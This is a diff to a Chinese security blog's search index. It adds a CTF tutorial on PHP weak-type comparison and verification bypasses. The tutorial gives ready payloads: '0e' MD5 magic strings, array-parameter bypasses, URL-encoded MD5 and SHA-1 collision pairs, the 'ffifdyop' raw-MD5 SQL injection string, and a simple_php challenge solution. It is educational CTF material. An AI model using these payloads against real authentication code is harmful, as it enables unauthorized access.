@@ -5363,6 +5270,12 @@ level4level5level6level7level8level9level10level11level12level13level14level15le
         <tag>CTF-WriteUp</tag>
         <tag>Web-XSS</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>SSTI漏洞-基础篇</title>
+    <url>/posts/416548136/</url>
+    <content><![CDATA[施工中
+]]></content>
   </entry>
   <entry>
     <title>ROIS2024冬令营</title>
@@ -5554,19 +5467,6 @@ public function __toString() &#123;    global $flag;    echo $flag;    return &q
       </tags>
   </entry>
   <entry>
-    <title>反序列化漏洞-入门</title>
-    <url>/posts/2255213327/</url>
-    <content><![CDATA[施工中
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF-Web</tag>
-        <tag>Web-Unserialize</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XSS绕过篇</title>
     <url>/posts/1946610579/</url>
     <content><![CDATA[施工中
@@ -5615,6 +5515,106 @@ eval()绕过XSS绕过总结探测字典：&#x27;&quot;()&lt; &gt;&lt;script&gt; 
       <tags>
         <tag>CTF-Web</tag>
         <tag>Web-XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF-PHP验证</title>
+    <url>/posts/2808981175/</url>
+    <content><![CDATA[PHPPHP中的比较符php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换。
+在php中有两种比较符号: 一种是 弱等于，另外一种是 强等于，都是用来比较两个数值是否相等的操作符，但他们也是有区别的:
+
+弱等于
+在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。
+
+==：等于比较符号。用于比较两个值是否相等，不考虑数据类型。
+
+!= 或 &lt;&gt;：不等于比较符号。用于比较两个值是否不相等，不考虑数据类型。
+
+&lt;：小于比较符号。用于比较两个值的大小，如果左侧的值小于右侧的值，则条件为真。
+
+&gt;：大于比较符号。用于比较两个值的大小，如果左侧的值大于右侧的值，则条件为真。
+
+&lt;=：小于等于比较符号。用于比较两个值的大小，如果左侧的值小于或等于右侧的值，则条件为真。
+
+&gt;=：大于等于比较符号。用于比较两个值的大小，如果左侧的值大于或等于右侧的值，则条件为真。
+
+
+
+强等于
+在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。
+
+===：全等比较符号。用于比较两个值是否相等，并且数据类型也相同。
+!==：不全等比较符号。用于比较两个值是否不相等，或者数据类型不相同。
+
+
+
+弱等于转化规则规则1.若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,’E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字（最开头的部分），则其值就是开始的数字，否则（包括后面出现数字的情况），其值为0。例如:
+12==&quot;12&quot;                         // true12==&quot;12aa&quot;                       //true&quot;admin&quot;==0		     	       //truefalse == &quot;&quot; == 0 == NULL		//true
+
+2.布尔值true和任意字符串都弱相等。例如:
+true==&quot;wells&quot;                     //true
+
+3.数字和“e”开头加上数字的字符串（例如”1e123”）会当作科学计数法去比较；    0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0；
+绕过MD5验证弱类型比较0e绕过原理：若使用PHP的弱比较时，0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0
+例：
+md5(&#x27;QNKCDZO&#x27;) == md5(240610708)
+
+MD5加密后得到
+0e830400451993494058024219903391 == 0e462097431906509019562988736854  //即0==0，为true
+
+
+
+常用MD5加密后为0e的字符串QNKCDZO240610708byGcYsonZ7yaabg7XSsaabC9RqSs878926199as155964671as214587387as1091221200a
+
+
+
+强类型比较数组绕过原理：MD5无法加密数组，使用数组虽然会报错，返回了null，null&#x3D;&#x3D;null
+使用方法
+a[]=a&amp;b[]=b 
+
+
+
+强类型绕过（MD5碰撞）原理：使用两个数值不同但MD5值相同的字符串（以下字符串经过URL编码）
+--------------------c=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   d=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2--------------------param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2    param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2------------------- Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2    Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2--------------------    --------------------$s1 = %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab$s2 = %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab$s3 = %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab--------------------
+
+拓:sha1加密的两个相同值array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
+
+
+
+MD5-SQL注入题目类似于
+&lt;?phpsql=&quot;select * from admin where password=&#x27;&quot;.md5($pass,true).&quot;&#x27;&quot;;?&gt;
+
+一个ticker：字符串：ffifdyop的md值为
+&#x27;or&#x27;6�]��!r,��b
+
+拼凑到sql语句中变成了
+select * from &quot;admin&quot; where password=&#x27;&#x27;or&#x27;6�]��!r,��b&#x27;
+
+由于非空字符串认为真，所有实现了sql注入
+参考文章
+参考**CSDN博主[yจุ๊บng]**的文章
+原文链接：总结ctf中 MD5 绕过的一些思路_ctf md5-CSDN博客
+
+
+实战1.攻防世界-simple_php&lt;?phpshow_source(__FILE__);include(&quot;config.php&quot;);$a=@$_GET[&#x27;a&#x27;];$b=@$_GET[&#x27;b&#x27;];if($a==0 and $a)&#123;  echo $flag1;&#125;if(is_numeric($b))&#123;  exit();&#125;if($b&gt;1234)&#123;  echo $flag2;&#125;?&gt;
+
+此处使用任意开头不含数字的字符串可使a的相关条件通过。
+
+第一个条件：由于a是弱比较，此时任意开头不含数字的字符串被当成0进行比价
+第二个条件：a不为空（非空字符串），则条件为真。如果a 是一个空字符串，条件将为假。
+
+此处使用开头含数字且数字大于1234的字符串可使b的相关条件通过。
+
+第一个条件：要求b不能是一个数字或者是全由数字构成的字符串
+第二个条件：此时进行若比较，开头含数字且数字大于1234的字符串会被作为数字进行比较
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF-Web</tag>
+        <tag>Web-PHP</tag>
       </tags>
   </entry>
 </search>
